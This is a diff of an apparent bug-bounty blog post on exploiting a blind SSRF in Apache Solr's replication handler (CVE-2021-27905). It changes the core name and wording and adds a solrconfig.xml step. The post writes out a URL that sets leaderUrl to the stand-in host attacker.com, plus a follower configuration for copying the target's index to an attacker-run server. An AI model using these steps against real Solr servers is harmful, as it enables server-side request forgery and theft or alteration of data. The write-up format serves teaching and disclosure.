@@ -24,9 +24,9 @@ Now, with a more possitive perspective in mind, when I remembered that I had a b
 
 [[ Understanding the blind SSRF ]]
 
-My first objective was to fully understand the blind SSRF vulnerability, since I originally found it by looking for common Solr vulnerabilities and didn't go any deeper. As already mentioned it's knwon as <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27905">CVE-2021-27905</a>, and is located in the replication handler of the Solr server, which in this case was at "/solr/&lt;core&gt;/replication". It could be triggered by visiting the following URL, where "en" is the name of one of the available Solr cores in the target server:
+My first objective was to fully understand the blind SSRF vulnerability, since I originally found it by looking for common Solr vulnerabilities and didn't go any deeper. As already mentioned it's knwon as <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27905">CVE-2021-27905</a>, and is located in the replication handler of the Solr server, which in this case was at "/solr/&lt;core&gt;/replication". It could be triggered by visiting the following URL, where "de" is the name of one of the available Solr cores in the target server:
 
-<div class="code">https://target.com/solr/en/replication?command=fetchindex&leaderUrl=attacker.com</div>
+<div class="code">https://target.com/solr/de/replication?command=fetchindex&leaderUrl=attacker.com</div>
 
 In order to learn more about all the functionalites involved in this bug, I needed to look at the Solr docs. Luckily, Apache maintains a huge web portal to host the Solr documentation, so it was not diffcult to find the <a href="https://solr.apache.org/guide/solr/latest/deployment-guide/user-managed-index-replication.html">chapter related to Index Replication</a>. As I learnt, replication allows creating an infrastructure of several Solr instances in which a leader instance distributes copies of its data to the follower instances. The leader then manages updates to the data while the followers manage the querying.
 
@@ -47,11 +47,11 @@ This meant that the Solr server in which I found the blind SSRF was a follower i
 
 Looking around, I also learnt about other replication commands, such as "details" which can be used to retrieve the replication configuration. In this case, it could be executed at the followin URL:
 
-<div class="code">https://target.com/solr/en/replication?command=details</div>
+<div class="code">https://target.com/solr/de/replication?command=details</div>
 
-The server sent back a huge JSON response that I didn't understand at the moment (also, I couldn't find any copy of this response when writing this post, since they have now restricted access to this endpoint and I didn't take enough screenshots lol). However, I learnt from this output that this server also allowed others to replicate data from it, meaning that I could download the entire database.
+The server sent back a huge JSON response that I didn't understand at the moment (also, I couldn't find any copy of this response when writing this post, since they have now restricted access to this endpoint and I didn't take enough screenshots lol). However, I learnt from this output that this server also allowed others to replicate data from it, meaning that I could download the entire dataset.
 
-This would be very useful, since, theoretically, I could just replicate the entire database, introduce a test enrty and then distribute it back to the target server. This way, the service wouldn't be interrupted in any way, but I could easily prove that I was able to modify the data by querying for the newly added entry.
+This would be very useful, since, theoretically, I could just replicate the dataset, introduce a test enrty and then distribute it back to the target server. This way, the service wouldn't be interrupted in any way, but I could easily prove that I was able to modify the dataset by querying for the newly added entry.
 
 Great, the goal now was first to deplout a malicious Solr instance and check if I could replicate the database from the target server.
 
@@ -90,5 +90,15 @@ It can then be queried at the select request handler:
   }
 }
 </div>
+
+Next step was to configure the replication handler for the core as a follower of the target server "https://target.com/solr/de/". To do so, I needed to edit the core configuration file located at "server/solr/hacefresk0/conf/solrconfig.xml" and add the following entry:
+
+<div class="code">&#60;requestHandler name="/replication" class="solr.ReplicationHandler" &#62;
+  &#60;lst name="slave"&#62;
+        &#60;str name="leaderUrl"&#62;https://target.com/solr/de/&#60;/str&#62;
+        &#60;str name="pollInterval"&#62;00:00:20&#60;/str&#62;
+  &#60;/lst&#62;
+&#60;/requestHandler&#62;</div>
+
 
 {% endraw %}
